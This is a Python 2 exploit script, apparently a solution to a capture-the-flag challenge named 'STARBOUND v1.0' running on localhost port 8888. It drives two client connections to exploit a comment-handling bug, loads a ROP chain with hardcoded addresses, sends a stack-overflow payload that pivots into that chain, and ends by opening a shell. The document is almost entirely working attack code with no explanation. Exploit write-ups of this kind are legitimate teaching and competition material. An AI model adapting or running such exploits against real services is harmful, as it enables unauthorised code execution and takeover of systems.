#!/usr/bin/env python

'''
Multiplayer: comments miss trailing '\n' if close sender directly
'''

from util import *
import re

ip = '127.0.0.1'
port = 8888

def move_left():
  s2.recvuntil('> ')
  s2.send('2\n')
  s2.recvuntil('> ')
  s2.send('2\n')
  s2.recvuntil('> ')
  s2.send('1\n')

def move_right():
  s2.recvuntil('> ')
  s2.send('2\n')
  s2.recvuntil('> ')
  s2.send('3\n')
  s2.recvuntil('> ')
  s2.send('1\n')

def put_stone(n):
  s2.recvuntil('> ')
  s2.send('4\n')
  for i in range(n):
    s2.recvuntil('> ')
    s2.send('3\n')
  s2.recvuntil('> ')
  s2.send('1\n')


s2 = service()

print '[sender1]'
while True:
  try:
    s2.connect(ip, port)
    tmp = s2.recvuntil('-+STARBOUND v1.0+-')
    pos = int(re.findall('Pos: ([0-9 ]+) HP', tmp)[0])
    s2.recvuntil('> ')
    s2.send('1\n')
    s2.recvuntil('Size: ')
    x = s2.recvuntil('\n')
    restsize = int(x) - pos
    pwidth = 7
    if pos%2==0:
      pwidth += 1
      restsize += 1

    for i in range(pwidth):
      move_left()
      s2.recvuntil('> ')
      s2.send('4\n')
      while True:
        if 'Crash' in s2.recvuntil('> '):
          s2.send('1\n')
          break
        else:
          s2.send('2\n')
    put_stone(10)
    move_right()
    move_right()
    move_right()
    move_right()
    put_stone(4)
    break
  except socket.timeout:
    print '1> retry'
    s2.close()

s = service()
s.connect(ip, port)
s.recvuntil('-+STARBOUND v1.0+-')

rop_chain = s.rop_setup(
    read = 0x08048A70, 
    write = 0x08048A30,
    leave = 0x0804A673, 
    buf = 0x08058BF0,
    pop_bx_si_di_bp = 0x080496E3)
s.recvuntil('> ')
s.send('1'.ljust(8) + rop_chain + '\n')     # preload ROP chain into stack buffer

s.recvuntil('> ')
s.send('7\n')
s.recvuntil('> ')
s.send('2\n')
portal = int(re.findall('\[Info\] Portal ([0-9]+) enabled', s.recvuntil('\n'))[0])
s.recvuntil('> ')
s.send('4\n')

s2.recvuntil('> ')
s2.send('7\n')
s2.recvuntil('> ')
s2.send('5\n')
s2.recvuntil('Your friend\'s portal ID: ')
s2.send(str(portal) + '\n')
s2.recvuntil('Make some comments: ')
s2.send('A')
s2.close()

print '[sender2]'
while True:
  try:
    s2.connect(ip, port)
    tmp = s2.recvuntil('-+STARBOUND v1.0+-')
    pos = int(re.findall('Pos: ([0-9 ]+) HP', tmp)[0])
    if pos%2==1:
      move_left()

    for i in range(2):
      move_left()
      s2.recvuntil('> ')
      s2.send('4\n')
      while True:
        if 'Crash' in s2.recvuntil('> '):
          s2.send('1\n')
          break
        else:
          s2.send('2\n')
    s2.recvuntil('> ')
    s2.send('7\n')
    s2.recvuntil('> ')
    s2.send('5\n')
    s2.recvuntil('Your friend\'s portal ID: ')
    s2.send(str(portal) + '\n')
    s2.recvuntil('Make some comments: ')
    x = (600-pos-restsize-4)/2
    s2.send('B'*x + '\n')
    s2.close()
    break
  except socket.timeout:
    print '2> retry'
    s2.close()

print 'GO!'
s.send('\x00'*3 + 'A'*180 + p32(0x0804997E) + 'A'*24) # add esp, 0x1c; ret -> rop buffer
time.sleep(1)
print s.recvuntil('Landing ...')
time.sleep(1)
print s.recvuntil(' \_______________________________________________/\n\n')
print s.recv().encode('hex')
s.pwn_shell()
s.close()
